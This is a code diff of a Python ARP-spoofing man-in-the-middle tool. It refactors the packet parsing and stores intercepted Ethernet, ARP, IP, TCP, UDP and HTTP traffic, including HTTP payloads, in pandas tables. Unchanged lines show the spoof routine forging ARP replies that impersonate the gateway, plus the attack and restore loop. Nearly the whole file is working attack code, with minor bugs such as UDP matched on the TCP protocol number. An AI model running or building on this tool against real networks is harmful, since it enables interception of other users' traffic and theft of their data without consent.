@@ -13,11 +13,12 @@ import scapy.layers.l2
 import scapy.route
 import sys
 import netifaces
-
-
+import pandas as pd
+from scapy.config import conf
 from scapy.layers.l2 import ARP, Ether
 
 #os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+conf.debug_dissector = 2
 
 def get_default_gateway():
     """ python style if it exists there is a python lib that can do it in 3 lines of code """
@@ -42,118 +43,59 @@ def ipv4(addres):
 
 def parse_http(data):
     try:
-        return data.decode('utf-8')
+        return data.decode('utf-8', errors='ignore')
     except UnicodeDecodeError:
         return data.decode('latin1', errors='ignore')
 
-class Ethernet_frame():
-    def __init__(self, data):
-        dest_mac, source_mac, proto = struct.unpack('! 6s 6s H', data[:14])
-        self.dest_mac, self.source_mac, self.eth_proto, self.data = get_mac_adress(dest_mac), get_mac_adress(source_mac), socket.htons(proto), data[14:]
-        self.type = 'Ethernet_frame'
-    def print_values(self):
-        print('Ethernet Frame')
-        print('Destination: {}, Source: {}, Protocol: {}'.format(self.dest_mac, self.source_mac, self.eth_proto))
+def Ethernet_frame(data):
+    dest_mac, source_mac, proto = struct.unpack('! 6s 6s H', data[:14])
+    return {'data': data[14:], 'dest_mac' : get_mac_adress(dest_mac), 'source_mac' : get_mac_adress(source_mac), 'eth_proto' : socket.htons(proto)}
 
-class IPv4_packet(Ethernet_frame):
-    def __init__(self, data):
-        Ethernet_frame.__init__(self, data)
-        version_header_length = self.data[0]
-        self.version  = version_header_length >> 4
-        self.header_length = (version_header_length & 15) * 4
-        self.time_to_live, self.proto, src, target = struct.unpack('! 8x B B 2x 4s 4s', self.data[:20])
-        self.src, self.target, self.data = ipv4(src), ipv4(target), self.data[self.header_length:]
-        self.type = 'IPv4_packet'
-    def print_values(self):
-        Ethernet_frame.print_values(self)
-        if (self.eth_proto == 8):
-            print('IPv4 packet:')
-            print('Version: {}, Header lenght: {}, time to live: {}'.format(self.version, self.header_length, self.time_to_live))
-            print('Protocol: {}, Source: {}, Target: {}'.format(self.proto, self.src, self.target))
+def IPv4_packet(unpacked):
+    data = unpacked['data']
+    version_header_length = data[0]
+    unpacked['version']  = version_header_length >> 4
+    unpacked['header_length'] = (version_header_length & 15) * 4
+    unpacked['time_to_live'], unpacked['proto'], src, target = struct.unpack('! 8x B B 2x 4s 4s', data[:20])
+    unpacked['src'], unpacked['target'], unpacked['data'] = ipv4(src), ipv4(target), data[unpacked['header_length']:]
+    return unpacked
 
-class ARP_packet(Ethernet_frame):
-    def __init__(self, data):
-        Ethernet_frame.__init__(self, data)
-        self.HTYPE, self.PTYPE, self.HLEN, self.PLEN, self.operation, b_SHA, b_SPA, b_THA, b_TPA = struct.unpack('! H H B B H 6s 4s 6s 4s', self.data)
-        self.SHA, self.SPA, self.THA, self.TPA = get_mac_adress(b_SHA), ipv4(b_SPA), get_mac_adress(b_THA), ipv4(b_TPA)
-        self.type = 'ARP_packet'
-    def print_values(self):
-        Ethernet_frame.print_values(self)
-        print("ARP request:")
-        print('HTYPE: {}, PTYPE: {}, HLEN: {}, PLEN: {}, operation: {}'.format(self.HTYPE, self.PTYPE, self.HLEN, self.PLEN, self.operation))
-        print('SHA: {}, SPA: {}, THA: {}, TPA: {}'.format(self.SHA, self.SPA, self.THA, self.TPA))
+def ARP_packet(unpacked):
+    data = unpacked['data']
+    unpacked['HTYPE'], unpacked['PTYPE'], unpacked['HLEN'], unpacked['PLEN'],unpacked['operation'], b_SHA, b_SPA, b_THA, b_TPA = struct.unpack('! H H B B H 6s 4s 6s 4s', data)
+    unpacked['SHA'], unpacked['SPA'], unpacked['THA'], unpacked['TPA'] = get_mac_adress(b_SHA), ipv4(b_SPA), get_mac_adress(b_THA), ipv4(b_TPA)
+    return unpacked
 
-class ICMP(IPv4_packet):
-    def __init__(self, data):
-        IPv4_packet.__init__(self, data)
-        self.icmp_type, self.code, self.checksumm = struct.unpack('! B B H', self.data[:4])
-        self.data = self.data[4:]
-        self.type = 'ICMP'
-    def print_values(self):
-        IPv4_packet.print_values(self)
-        print('ICMP packet:')
-        print('ICMP type: {}, Code: {}, Checksumm: {}'.format(self.icmp_type, self.code, self.checksumm))
+def ICMP_packet(unpacked):
+    data = unpacked['data']
+    unpacked['icmp_type'], unpacked['code'], unpacked['checksumm'] = struct.unpack('! B B H', data[:4])
+    unpacked['data'] = data[4:]
+    return unpacked
 
+def TCP_packet(unpacked):
+    data = unpacked['data']
+    unpacked['src_port'], unpacked['dest_port'], unpacked['sequence'], unpacked['aknowledgment'], unpacked['offset_reseved_flags'] = struct.unpack('! H H L L H', data[:14])
+    offset = (unpacked['offset_reseved_flags'] >> 12) * 4
+    unpacked['flag_urg'] = (unpacked['offset_reseved_flags'] & 32) >> 5
+    unpacked['flag_ack'] = (unpacked['offset_reseved_flags'] & 16) >> 4
+    unpacked['flag_psh'] = (unpacked['offset_reseved_flags'] & 8) >> 3
+    unpacked['flag_rst'] = (unpacked['offset_reseved_flags'] & 4) >> 2
+    unpacked['flag_syn'] = (unpacked['offset_reseved_flags'] & 2) >> 1
+    unpacked['flag_fin'] = unpacked['offset_reseved_flags'] & 1
+    unpacked['data'] = data[offset:]
+    return unpacked
 
-class TCP(IPv4_packet):
-    def __init__(self, data):
-        IPv4_packet.__init__(self, data)
-        self.src_port, self.dest_port, self.sequence, self.aknowledgment, self.offset_reseved_flags = struct.unpack('! H H L L H', self.data[:14])
-        offset = (self.offset_reseved_flags >> 12) * 4
-        self.flag_urg = (self.offset_reseved_flags & 32) >> 5
-        self.flag_ack = (self.offset_reseved_flags & 16) >> 4
-        self.flag_psh = (self.offset_reseved_flags & 8) >> 3
-        self.flag_rst = (self.offset_reseved_flags & 4) >> 2
-        self.flag_syn = (self.offset_reseved_flags & 2) >> 1
-        self.flag_fin = self.offset_reseved_flags & 1
-        self.data = self.data[offset:]
-        self.type = 'TCP'
-    def print_values(self):
-        IPv4_packet.print_values(self)
-        print('TCP packet:')
-        print('Source port: {}, Destination port: {}'.format(self.src_port, self.dest_port))
-        print('Sequence: {}, aknowledgment: {}'.format(self.sequence, self.aknowledgment))
-        print('Flags:')
-        print('URG: {}, ACK: {}, PSH: {}, SYN: {}, FIN: {}'.format(self.flag_urg, self.flag_ack, self.flag_psh, self.flag_rst, self.flag_syn, self.flag_fin))
+def UDP_packet(unpacked):
+    data = unpacked['data']
+    unpacked['src_port'], unpacked['dest_port'], unpacked['size'] = struct.unpack('! H H 2x H', data[:8])
+    unpacked['data'] = data[8:]
+    return unpacked
 
-class UDP(IPv4_packet):
-    def __init__(self, data):
-        IPv4_packet.__init__(self, data)
-        self.src_port, self.dest_port, self.size = struct.unpack('! H H 2x H', self.data[:8])
-        self.data = self.data[8:]
-        self.type = 'UDP'
-    def print_values(self):
-        IPv4_packet.print_values(self)
-        print('UDP packet:')
-        print('Source port: {}, Destination port: {}, Size: {}'.format(self.src_port, self.dest_port, self.size))
-
-class HTTP(TCP):
-    def __init__(self, data):
-        TCP.__init__(self, data)
-        self.http_string = parse_http(self.data)
-        self.type = 'HTTP'
-    def print_values(self):
-        TCP.print_values(self)
-        print('HTTP request:')
-        print('HTTP string: {}'.format(self.http_string))
-
-
-def factory(data):
-    obj = Ethernet_frame(data)
-    if (obj.eth_proto == 8 and len(obj.data) >= 20):
-        obj = IPv4_packet(data)
-        if (obj.proto == 1 and len(obj.data) >= 4):
-            obj = ICMP(data)
-        elif (obj.proto == 6 and len(obj.data) >= 14):
-            obj = TCP(data)
-            if (b'HTTP' in obj.data and len(obj.data) > 0):
-                obj = HTTP(data)
-        elif (obj.proto == 6 and len(obj.data) >= 8):
-            obj = UDP(data)
-    elif (obj.eth_proto == 1544 and len(obj.data) == 28):
-        obj = ARP_packet(data)
-    return obj
-
+def HTTP_packet(unpacked):
+    data = unpacked['data']
+    unpacked['http_string'] = parse_http(data)
+    unpacked['data'] = b''
+    return unpacked
 
 def long2net(arg):
     if (arg <= 0 or arg >= 0xFFFFFFFF):
@@ -188,7 +130,6 @@ class Client():
         self.ip = ip
         self.mac = mac
         self.type = (self.ip == host_ip or self.ip == gateway_ip)
-        self.packets = []
         self.arp_packets = 0
     def spoof(self):
         send(Ether(dst=self.mac)/ARP(op=2, pdst=self.ip, psrc=gateway_ip, hwdst=self.mac, hwsrc = host_mac), verbose=False)
@@ -209,30 +150,10 @@ class IPtable():
         self.gateway_ip = gateway_ip
         self.gateway_mac = gateway_mac
         self.clients = [Client(self.ip, self.mac), Client(self.gateway_ip, self.gateway_mac)]
-        self.unreg_packets = []
 
     def find(self, client):
         for i, c in enumerate(self.clients):
             if (c.ip == client.ip):
-                return i
-        return -1
-
-    def find_mac(self, mac):
-        if (mac == gateway_mac):
-            return 1
-        if (mac == host_mac):
-            return 0
-        for i in range(len(self.clients)):
-            if (self.clients[i].mac == mac):
-                return i
-        return -1
-    def find_ip(self, ip):
-        if (ip == gateway_ip):
-            return 1
-        if (ip == host_ip):
-            return 0
-        for i in range(len(self.clients)):
-            if (self.clients[i].ip == ip):
                 return i
         return -1
 
@@ -273,30 +194,62 @@ class IPtable():
                 for i in range(20):
                     client.restore()
 
-    def insert_packet(self, data):
-        packet = factory(data)
-        if packet.type != 'Ethernet_frame' and packet.type != 'ARP_packet':
-            client_id = self.find_ip(packet.src)
-            if (client_id != -1):
-                self.clients[client_id].packets.append(packet)
-                return
-        client_id = self.find_mac(packet.source_mac)
-        if (client_id != -1):
-            self.clients[client_id].packets.append(packet)
-            return
-        self.unreg_packets.append(packet)
-        return;
+class Database():
+    def __init__(self):
+        self.Ethernet_frames = pd.DataFrame({'data': [], 'dest_mac':[], 'source_mac':[], 'eth_proto':[]})
+        self.ARP_packets = pd.DataFrame({'data': [], 'dest_mac':[], 'source_mac':[], 'eth_proto':[], 'SHA':[], 'SPA':[], 'THA':[], 'TPA':[]})
+        self.IP_v4_packets = pd.DataFrame({'data': [], 'dest_mac':[], 'source_mac':[], 'eth_proto':[], 'version':[], 'header_length':[], 'time_to_live':[], 'proto':[], 'src':[], 'target':[]})
+        self.ICMP_packets = pd.DataFrame({'data': [], 'dest_mac':[], 'source_mac':[], 'eth_proto':[], 'version':[], 'header_length':[], 'time_to_live':[], 'proto':[], 'src':[], 'target':[], 'icmp_type':[],'code':[], 'checksumm':[]})
+        self.UDP_packets = pd.DataFrame({'data': [], 'dest_mac':[], 'source_mac':[], 'eth_proto':[], 'version':[], 'header_length':[], 'time_to_live':[], 'proto':[], 'src':[], 'target':[], 'src_port':[], 'dest_port':[], 'size':[]})
+        self.TCP_packets = pd.DataFrame({'data': [], 'dest_mac':[], 'source_mac':[], 'eth_proto':[], 'version':[], 'header_length':[], 'time_to_live':[], 'proto':[], 'src':[], 'target':[], 'src_port':[], 'dest_port':[], 'sequence':[], 'aknowledgment':[], 'offset_reseved_flags':[], 'flag_urg':[], 'bflag_ack':[], 'flag_psh':[], 'flag_rst':[], 'flag_syn':[], 'flag_fin':[]})
+        self.HTTP_packets = pd.DataFrame({'data': [], 'dest_mac':[], 'source_mac':[], 'eth_proto':[], 'version':[], 'header_length':[], 'time_to_live':[], 'proto':[], 'src':[], 'target':[], 'src_port':[], 'dest_port':[], 'sequence':[], 'aknowledgment':[], 'offset_reseved_flags':[], 'flag_urg':[], 'bflag_ack':[], 'flag_psh':[], 'flag_rst':[], 'flag_syn':[], 'flag_fin':[], 'http_string':[]})
+    def insert_data(self, data):
+        unpacked = Ethernet_frame(data)
+        if (len(unpacked['data']) >= 20 and unpacked['eth_proto'] == 8):
+            unpacked = IPv4_packet(unpacked)
+            if (unpacked['proto'] == 1 and len(unpacked['data']) >= 4):
+                unpacked = ICMP_packet(unpacked)
+                unpacked['data'] = str(unpacked['data'])
+                self.ICMP_packets.loc[self.ICMP_packets.shape[0]] = unpacked
+            elif (unpacked['proto'] == 6 and len(unpacked['data']) >= 14):
+                unpacked = TCP_packet(unpacked)
+                if (b'HTTP' in unpacked['data'] and len(unpacked['data']) > 0):
+                    unpacked = HTTP_packet(unpacked)
+                    unpacked['data'] = str(unpacked['data'])
+                    self.HTTP_packets.loc[self.HTTP_packets.shape[0]] = unpacked
+                else:
+                    unpacked['data'] = str(unpacked['data'])
+                    self.TCP_packets.loc[self.TCP_packets.shape[0]] = unpacked
+            elif (unpacked['proto'] == 6 and len(unpacked['data']) >= 8):
+                unpacked = UDP_packet(unpacked)
+                unpacked['data'] = str(unpacked['data'])
+                self.UDP_packets.loc[self.UDP_packets.shape[0]] = unpacked
+            else:
+                unpacked['data'] = str(unpacked['data'])
+                self.IP_v4_packets.loc[self.IP_v4_packets.shape[0]] = unpacked
+        elif (len(unpacked['data']) == 28 and unpacked['eth_proto'] == 1544 ):
+            unpacked = ARP_packet(unpacked)
+            unpacked['data'] = str(unpacked['data'])
+            self.ARP_packets.loc[self.ARP_packets.shape[0]] = unpacked
+        else:
+            unpacked['data'] = str(unpacked['data'])
+            self.Ethernet_frames.loc[self.Ethernet_frames.shape[0]] = unpacked
 
 
-def Sniff(Ips):
-    sniff(prn=lambda x: Ips.insert_packet(x.do_build()), count=0)
+def Sniff(db):
+    while(True):
+        try:
+            sniff(prn=lambda x: db.insert_data(x.do_build()), count=0, session = DefaultSession)
+        except:
+            continue
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     gateway_mac = getmacbyip(gateway_ip).upper()
     Ips = IPtable(host_mac, host_ip, gateway_ip, gateway_mac)
     Ips.scan()
-    th_sniff = threading.Thread(target=Sniff, args=(Ips, ), daemon=True)
+    db = Database()
+    th_sniff = threading.Thread(target=Sniff, args=(db, ), daemon=True)
     th_sniff.start()
     try:
         Ips.attack()
@@ -311,22 +264,35 @@ if __name__ == '__main__':
                 for i in Ips.clients:
                     print(i.ip, i.mac)
             if command == 'packets':
-                for i in range(len(Ips.clients)):
-                    print(i + 1, Ips.clients[i].ip, len(Ips.clients[i].packets))
-                print(len(Ips.clients) + 1, 'other', len(Ips.unreg_packets))
-                a = ""
-                while( a != 'back' and (a.isdigit() == False or (int(a) < 1 and int(a) >= len(Ips.clients)))):
-                    a = input('choose target ip:')
-                if a == 'back':
+                print(1, 'Ethernet_frames:', db.Ethernet_frames.size)
+                print(2, 'ARP_packets:', db.ARP_packets.size)
+                print(3, 'IP_v4_packets:', db.IP_v4_packets.size)
+                print(4, 'ICMP_packets:', db.ICMP_packets.size)
+                print(5, 'UDP_packets:', db.UDP_packets.size)
+                print(6, 'TCP_packets:', db.TCP_packets.size)
+                print(7, 'HTTP_packets:', db.HTTP_packets.size)
+                choice = ''
+                while (choice != 'back' and (choice.isdigit() == False or (int(choice) < 1 or int(choice) > 7))):
+                    choice = input('choose type: ')
+                if (choice == 'back'):
                     continue
-                if int(a) == len(Ips.clients) + 1:
-                    for i in Ips.unreg_packets:
-                        i.print_values()
-                    continue
-                a = int(a) - 1
-                for i in Ips.clients[a].packets:
-                    i.print_values()
-                    #print(i.data)
+                choice = int(choice)
+                if (choice == 1):
+                    print(db.Ethernet_frames)
+                elif (choice == 2):
+                    print(db.ARP_packets)
+                elif (choice == 3):
+                    print(db.IP_v4_packets)
+                elif (choice == 4):
+                    print(db.ICMP_packets)
+                elif (choice == 5):
+                    print(db.UDP_packets)
+                elif (choice == 6):
+                    print(db.TCP_packets)
+                elif (choice == 7):
+                    print(db.HTTP_packets)
+                
         Ips.restore()
     except:
         Ips.restore()
+        raise()
